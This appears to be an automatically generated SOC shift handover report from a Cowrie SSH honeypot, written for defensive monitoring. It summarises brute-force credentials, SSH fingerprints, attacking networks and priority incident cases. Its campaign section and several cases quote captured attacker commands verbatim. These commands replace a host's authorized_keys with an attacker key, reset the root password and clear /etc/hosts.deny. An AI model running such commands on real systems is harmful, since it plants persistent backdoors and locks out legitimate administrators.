# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-05 |
| **Generated At** | 2026-05-05T17:28:47Z |
| **Shift Time** | 17:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **567** |
| Confirmed Threats | **494** |
| False Positives Filtered | **73** (12.9%) |
| Unique Attacker IPs | **82** |
| Countries of Origin | **30** |
| High Severity Cases | **94** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **473** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **230** |
| Unique Credential Pairs | **134** |
| Unique Usernames | **48** |
| Unique Passwords | **121** |
| Successful Auth Pairs | **54** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 94 |
| `345gs5662d34` | 46 |
| `ubuntu` | 20 |
| `admin` | 10 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 46 |
| `3245gs5662d34` | 46 |
| `root` | 4 |
| `test` | 4 |
| `welcome` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 46 |
| `root` | `3245gs5662d34` | 46 |
| `root` | `zxcv1234.` | 2 |
| `admin` | `admin` | 2 |
| `wp-user` | `password` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `zxcv1234.` | `118.33.113.91` | 2026-05-05T12:35:00 |
| `root` | `3245gs5662d34` | `118.33.113.91` | 2026-05-05T12:35:04 |
| `root` | `Qaz12!@#` | `101.47.8.188` | 2026-05-05T12:44:58 |
| `root` | `3245gs5662d34` | `101.47.8.188` | 2026-05-05T12:45:26 |
| `root` | `test1234567890` | `45.196.165.49` | 2026-05-05T12:47:34 |
| `root` | `3245gs5662d34` | `45.196.165.49` | 2026-05-05T12:47:41 |
| `root` | `debug` | `45.196.165.49` | 2026-05-05T12:49:25 |
| `root` | `1qaz2wsx#edc` | `45.196.165.49` | 2026-05-05T12:50:23 |
| `root` | `Hy123456789` | `45.196.165.49` | 2026-05-05T12:51:27 |
| `root` | `123abC` | `45.196.165.49` | 2026-05-05T12:53:25 |
| `root` | `zz123321` | `45.196.165.49` | 2026-05-05T12:54:26 |
| `root` | `Asd147258369` | `45.196.165.49` | 2026-05-05T12:55:24 |
| `root` | `1qaz@wsx#` | `45.196.165.49` | 2026-05-05T12:57:11 |
| `root` | `Lc123456.` | `45.196.165.49` | 2026-05-05T12:59:00 |
| `root` | `jamie1` | `45.196.165.49` | 2026-05-05T13:02:43 |
| `root` | `An123456` | `45.196.165.49` | 2026-05-05T13:03:40 |
| `root` | `zxcv1234.` | `45.196.165.49` | 2026-05-05T13:04:37 |
| `root` | `Bc123456789` | `45.196.165.49` | 2026-05-05T13:05:36 |
| `root` | `abc123ABC` | `45.196.165.49` | 2026-05-05T13:06:36 |
| `root` | `AAAAAAAA` | `45.196.165.49` | 2026-05-05T13:07:36 |
| `root` | `Redhat@2024` | `45.196.165.49` | 2026-05-05T13:08:34 |
| `root` | `123456Ww` | `45.196.165.49` | 2026-05-05T13:09:33 |
| `root` | `ubuntu` | `117.176.220.76` | 2026-05-05T13:10:14 |
| `root` | `thankyou` | `45.196.165.49` | 2026-05-05T13:11:38 |
| `root` | `Cx123456.` | `45.196.165.49` | 2026-05-05T13:12:42 |
| `root` | `User@2025` | `36.92.140.209` | 2026-05-05T15:24:33 |
| `root` | `3245gs5662d34` | `36.92.140.209` | 2026-05-05T15:24:36 |
| `root` | `test123@` | `36.92.140.209` | 2026-05-05T15:26:39 |
| `root` | `yd@123456` | `36.92.140.209` | 2026-05-05T15:29:40 |
| `root` | `Q!w2E#r4T%` | `36.92.140.209` | 2026-05-05T15:30:37 |
| `root` | `Pa$$w0rd123` | `36.92.140.209` | 2026-05-05T15:32:37 |
| `root` | `rooT123` | `36.92.140.209` | 2026-05-05T15:33:38 |
| `root` | `Abcd123$%^` | `36.92.140.209` | 2026-05-05T15:34:37 |
| `root` | `123qweasd@` | `36.92.140.209` | 2026-05-05T15:39:32 |
| `root` | `Xd123456` | `36.92.140.209` | 2026-05-05T15:40:31 |
| `root` | `Qq123.com` | `36.92.140.209` | 2026-05-05T15:41:32 |
| `root` | `1qazxsw23EDC` | `36.92.140.209` | 2026-05-05T15:42:31 |
| `root` | `asdf@123456` | `36.92.140.209` | 2026-05-05T15:43:29 |
| `root` | `123qwe!` | `36.92.140.209` | 2026-05-05T15:46:30 |
| `root` | `Zxcasd123` | `36.92.140.209` | 2026-05-05T15:47:27 |
| `root` | `river123` | `36.92.140.209` | 2026-05-05T15:48:25 |
| `root` | `asdfzxcv1234` | `36.92.140.209` | 2026-05-05T15:49:21 |
| `root` | `lg@123456` | `36.92.140.209` | 2026-05-05T15:50:20 |
| `root` | `test321` | `36.92.140.209` | 2026-05-05T15:52:19 |
| `root` | `admin159` | `92.205.57.72` | 2026-05-05T16:50:44 |
| `root` | `3245gs5662d34` | `92.205.57.72` | 2026-05-05T16:50:47 |
| `root` | `admin@111` | `121.229.25.10` | 2026-05-05T16:55:14 |
| `root` | `vps123!@#` | `92.205.57.72` | 2026-05-05T17:04:14 |
| `root` | `admin!12345` | `92.205.57.72` | 2026-05-05T17:06:33 |
| `root` | `admin123456*` | `92.205.57.72` | 2026-05-05T17:08:07 |
| `root` | `admin@111` | `92.205.57.72` | 2026-05-05T17:09:44 |
| `root` | `$admin123` | `40.81.244.142` | 2026-05-05T17:21:56 |
| `root` | `3245gs5662d34` | `40.81.244.142` | 2026-05-05T17:21:58 |
| `root` | `testcloud` | `40.81.244.142` | 2026-05-05T17:24:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **567** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 262 |
| Go SSH scanner | 5 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 221 | 9 |
| `03a80b21afa8...` | Modern SSH client | 37 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 221 | 9 | libssh-based |
| `03a80b21afa8...` | libssh | 37 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 46 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:9ODURHFNUmZD"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.229.25.10`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.33.113.91`, `45.196.165.49`, `101.47.8.188`, `36.92.140.209`, `92.205.57.72`, `40.81.244.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **82** |
| Unique ASNs | **56** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 5 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS43060` | IPLUS LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (94)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-aae8fca33b96

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-05-05 12:35 |
| **Last Seen** | 2026-05-05 12:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:35:00` | `cowrie.session.connect` |
| `2026-05-05 12:35:00` | `cowrie.client.version` |
| `2026-05-05 12:35:00` | `cowrie.client.kex` |
| `2026-05-05 12:35:00` | `cowrie.login.success` |
| `2026-05-05 12:35:01` | `cowrie.session.params` |
| `2026-05-05 12:35:01` | `cowrie.command.input` |
| `2026-05-05 12:35:01` | `cowrie.command.failed` |
| `2026-05-05 12:35:01` | `cowrie.log.closed` |
| `2026-05-05 12:35:01` | `cowrie.session.params` |
| `2026-05-05 12:35:01` | `cowrie.command.input` |
| `2026-05-05 12:35:01` | `cowrie.session.file_download` |
| `2026-05-05 12:35:01` | `cowrie.log.closed` |
| `2026-05-05 12:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b16d3c66fc

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-05-05 12:35 |
| **Last Seen** | 2026-05-05 12:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:35:03` | `cowrie.session.connect` |
| `2026-05-05 12:35:03` | `cowrie.client.version` |
| `2026-05-05 12:35:04` | `cowrie.client.kex` |
| `2026-05-05 12:35:04` | `cowrie.login.success` |
| `2026-05-05 12:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69c97b286db

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-05-05 12:44 |
| **Last Seen** | 2026-05-05 12:45 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:44:55` | `cowrie.session.connect` |
| `2026-05-05 12:44:55` | `cowrie.client.version` |
| `2026-05-05 12:44:57` | `cowrie.client.kex` |
| `2026-05-05 12:44:58` | `cowrie.login.success` |
| `2026-05-05 12:44:58` | `cowrie.session.params` |
| `2026-05-05 12:44:58` | `cowrie.command.input` |
| `2026-05-05 12:44:58` | `cowrie.command.failed` |
| `2026-05-05 12:44:58` | `cowrie.log.closed` |
| `2026-05-05 12:44:59` | `cowrie.session.params` |
| `2026-05-05 12:44:59` | `cowrie.command.input` |
| `2026-05-05 12:44:59` | `cowrie.session.file_download` |
| `2026-05-05 12:44:59` | `cowrie.log.closed` |
| `2026-05-05 12:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98e20898f263

| Field | Detail |
|---|---|
| **Source IP** | `101.47.8[.]188` |
| **First Seen** | 2026-05-05 12:45 |
| **Last Seen** | 2026-05-05 12:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:45:19` | `cowrie.session.connect` |
| `2026-05-05 12:45:19` | `cowrie.client.version` |
| `2026-05-05 12:45:24` | `cowrie.client.kex` |
| `2026-05-05 12:45:26` | `cowrie.login.success` |
| `2026-05-05 12:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.8[.]188` to AbuseIPDB if not already reported
- [ ] Block `101.47.8[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c5cc45a3121

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:47 |
| **Last Seen** | 2026-05-05 12:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:47:33` | `cowrie.session.connect` |
| `2026-05-05 12:47:33` | `cowrie.client.version` |
| `2026-05-05 12:47:33` | `cowrie.client.kex` |
| `2026-05-05 12:47:34` | `cowrie.login.success` |
| `2026-05-05 12:47:35` | `cowrie.session.params` |
| `2026-05-05 12:47:35` | `cowrie.command.input` |
| `2026-05-05 12:47:35` | `cowrie.command.failed` |
| `2026-05-05 12:47:35` | `cowrie.log.closed` |
| `2026-05-05 12:47:36` | `cowrie.session.params` |
| `2026-05-05 12:47:36` | `cowrie.command.input` |
| `2026-05-05 12:47:36` | `cowrie.session.file_download` |
| `2026-05-05 12:47:36` | `cowrie.log.closed` |
| `2026-05-05 12:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ade9db2ad6

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:47 |
| **Last Seen** | 2026-05-05 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:47:40` | `cowrie.session.connect` |
| `2026-05-05 12:47:40` | `cowrie.client.version` |
| `2026-05-05 12:47:40` | `cowrie.client.kex` |
| `2026-05-05 12:47:41` | `cowrie.login.success` |
| `2026-05-05 12:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7afa0c31746

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:49 |
| **Last Seen** | 2026-05-05 12:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:49:23` | `cowrie.session.connect` |
| `2026-05-05 12:49:23` | `cowrie.client.version` |
| `2026-05-05 12:49:24` | `cowrie.client.kex` |
| `2026-05-05 12:49:25` | `cowrie.login.success` |
| `2026-05-05 12:49:25` | `cowrie.session.params` |
| `2026-05-05 12:49:25` | `cowrie.command.input` |
| `2026-05-05 12:49:25` | `cowrie.command.failed` |
| `2026-05-05 12:49:26` | `cowrie.log.closed` |
| `2026-05-05 12:49:26` | `cowrie.session.params` |
| `2026-05-05 12:49:26` | `cowrie.command.input` |
| `2026-05-05 12:49:26` | `cowrie.session.file_download` |
| `2026-05-05 12:49:26` | `cowrie.log.closed` |
| `2026-05-05 12:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07fdb0d742bb

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:49 |
| **Last Seen** | 2026-05-05 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:49:30` | `cowrie.session.connect` |
| `2026-05-05 12:49:30` | `cowrie.client.version` |
| `2026-05-05 12:49:30` | `cowrie.client.kex` |
| `2026-05-05 12:49:31` | `cowrie.login.success` |
| `2026-05-05 12:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa4cce61aba

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:50 |
| **Last Seen** | 2026-05-05 12:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:50:21` | `cowrie.session.connect` |
| `2026-05-05 12:50:21` | `cowrie.client.version` |
| `2026-05-05 12:50:21` | `cowrie.client.kex` |
| `2026-05-05 12:50:23` | `cowrie.login.success` |
| `2026-05-05 12:50:23` | `cowrie.session.params` |
| `2026-05-05 12:50:23` | `cowrie.command.input` |
| `2026-05-05 12:50:23` | `cowrie.command.failed` |
| `2026-05-05 12:50:23` | `cowrie.log.closed` |
| `2026-05-05 12:50:24` | `cowrie.session.params` |
| `2026-05-05 12:50:24` | `cowrie.command.input` |
| `2026-05-05 12:50:24` | `cowrie.session.file_download` |
| `2026-05-05 12:50:24` | `cowrie.log.closed` |
| `2026-05-05 12:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2343045dd6

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:50 |
| **Last Seen** | 2026-05-05 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 12:50:27` | `cowrie.session.connect` |
| `2026-05-05 12:50:27` | `cowrie.client.version` |
| `2026-05-05 12:50:28` | `cowrie.client.kex` |
| `2026-05-05 12:50:29` | `cowrie.login.success` |
| `2026-05-05 12:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.165[.]49` to AbuseIPDB if not already reported
- [ ] Block `45.196.165[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218b9237285e

| Field | Detail |
|---|---|
| **Source IP** | `45.196.165[.]49` |
| **First Seen** | 2026-05-05 12:51 |
| **Last Seen** | 2026-05-05 12:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
